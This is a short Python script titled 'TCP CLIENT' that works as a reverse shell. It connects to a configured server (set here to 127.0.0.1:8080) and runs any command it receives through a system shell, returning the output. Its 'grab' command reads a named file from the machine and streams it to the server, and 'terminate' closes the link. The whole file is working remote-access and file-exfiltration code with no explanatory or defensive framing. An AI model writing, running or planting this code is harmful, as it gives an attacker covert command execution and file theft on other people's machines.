
# TCP CLIENT

import socket  # for building TCP connection
import subprocess  # to start the shell in the system
import os  # os library


# host and port
HOST = "127.0.0.1"
PORT = 8080


# tranfer file
def transfer(s, path):

    if os.path.exists(path):
        f = open(path, "r")
        packet = f.read(1024)

        while packet != "":
            s.send(packet.encode())
            packet = f.read(1024)

        s.send("DONE".encode())
        f.close()
    else:
        s.send("Unable to find out the file".encode())


# connect to server
def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    while True:

        command = s.recv(1024).decode()  # receive command
        print(command)

        if "terminate" in command:
            s.close()  # close connection
            break

        elif "grab" in command:
            grab, path = command.split("*")
            try:
                transfer(s, path)
            except Exception as e:
                s.send(str(e).encode())
                pass

        else:
            # get access to the cmd/shell
            cmd = subprocess.Popen(command, shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())  # send the result
            s.send(cmd.stderr.read())  # in case of error send the error


# main function to run connection
def main():
    connect()


# run main()
main()
